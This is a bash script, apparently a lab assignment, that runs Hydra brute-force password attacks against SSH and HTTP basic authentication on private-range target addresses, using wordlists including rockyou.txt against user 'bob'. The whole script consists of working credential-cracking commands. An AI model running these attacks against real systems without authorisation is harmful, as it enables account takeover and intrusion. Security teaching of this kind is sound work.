#!/bin/bash
# Assignment 04: Password Attack Simulation using Hydra (SSH and HTTP)

TARGET_SSH_IP=${1:-"10.126.134.108"}
TARGET_HTTP_IP=${2:-"10.49.183.74"}

echo "=========================================================="
echo "   Assignment 04: Password Attack Simulation (Hydra)"
echo "   SSH Target  : $TARGET_SSH_IP"
echo "   HTTP Target : $TARGET_HTTP_IP"
echo "=========================================================="

# Check and install Hydra
if ! command -v hydra &> /dev/null; then
    echo "[*] Installing Hydra..."
    sudo apt update && sudo apt install -y hydra
else
    echo "[+] Hydra is installed."
fi

echo ""
echo "=========================================================="
echo "[+] Part 1: SSH Brute-Force Password Cracking"
echo "=========================================================="
echo "[*] Step 1.1: Verifying SSH service availability..."
nmap -sV -p 22 "$TARGET_SSH_IP" || true

echo ""
echo "[*] Step 1.2: Launching Hydra SSH attack..."
echo "Command: hydra -L wordlist.txt -P wordlist.txt -t 4 ssh://$TARGET_SSH_IP:22"
hydra -L wordlist.txt -P wordlist.txt -t 4 "ssh://$TARGET_SSH_IP:22" || true

echo ""
echo "=========================================================="
echo "[+] Part 2: HTTP Basic Authentication Cracking"
echo "=========================================================="
# Check rockyou wordlist or fallback to local wordlist
ROCKYOU="/usr/share/wordlists/rockyou.txt"
if [ ! -f "$ROCKYOU" ]; then
    if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
        echo "[*] Decompressing /usr/share/wordlists/rockyou.txt.gz..."
        sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
    else
        ROCKYOU="wordlist.txt"
    fi
fi

echo "[*] Using Wordlist: $ROCKYOU"
echo "[*] Running Hydra against HTTP-GET /protected for user 'bob'..."
echo "Command: hydra -l bob -P $ROCKYOU -t 4 $TARGET_HTTP_IP http-get /protected"
hydra -l bob -P "$ROCKYOU" -t 4 "$TARGET_HTTP_IP" http-get /protected || true

echo ""
echo "=========================================================="
echo "[+] Password Cracking Simulation Completed."
echo "=========================================================="

